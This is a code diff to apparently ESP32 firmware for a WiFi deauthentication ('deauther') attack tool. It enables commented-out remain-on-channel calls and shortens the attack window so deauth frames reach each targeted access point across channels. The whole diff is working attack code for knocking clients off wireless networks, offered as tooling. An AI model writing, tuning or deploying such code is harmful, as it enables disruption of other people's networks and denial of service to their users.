@@ -15,7 +15,7 @@
 #define DEAUTHER_TASK_PRIO 5
 // Syncronization times
 #define CHANNEL_SWITCH_DELAY 5   // Channel switch assestment time
-#define ATTACK_WINDOW        85  // RCO duration
+#define ATTACK_WINDOW        5  // RCO duration
 #define SOFTAP_REST_TIME     280   // Home channel time
 #define SINGLE_TARGET_ROOM   80
 #define SCAN_INTERVAL_US     30000000 // 30 seconds
@@ -267,8 +267,8 @@ static void deauther_send_frames(const target_info_t *target)
         for (uint8_t j = 0; j < num_channels; j++) 
         {
             uint8_t current_ch = target_channels[j];
-        // esp_err_t ret = wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
-        // if(ret != ESP_OK ) ESP_LOGI(TAG, "%s", esp_err_to_name(ret));
+        esp_err_t ret = wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
+        if(ret != ESP_OK ) ESP_LOGI(TAG, "%s", esp_err_to_name(ret));;
             vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
             int64_t start_time = esp_timer_get_time();
             for (int i = 0; i < aps.count; i++) 
@@ -283,7 +283,7 @@ static void deauther_send_frames(const target_info_t *target)
                 if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) {
                     /* Need more time on this channel to send to all aps */
                     vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
-                    // wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);
+                    wifi_set_temporary_channel(current_ch, ATTACK_WINDOW);;
                     vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                     start_time = esp_timer_get_time();
                 };
@@ -300,9 +300,8 @@ static void deauther_send_frames(const target_info_t *target)
     else 
     {
         /* Force ROC Requesto to prevents reception of ACK when sending UNICAST frames */
-        // wifi_set_temporary_channel(target->channel, ATTACK_WINDOW);
+        wifi_set_temporary_channel(target->channel, ATTACK_WINDOW);
         vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
-        esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
         execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
         //wifi_set_temporary_channel(target->channel, ATTACK_WINDOW);
         //vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
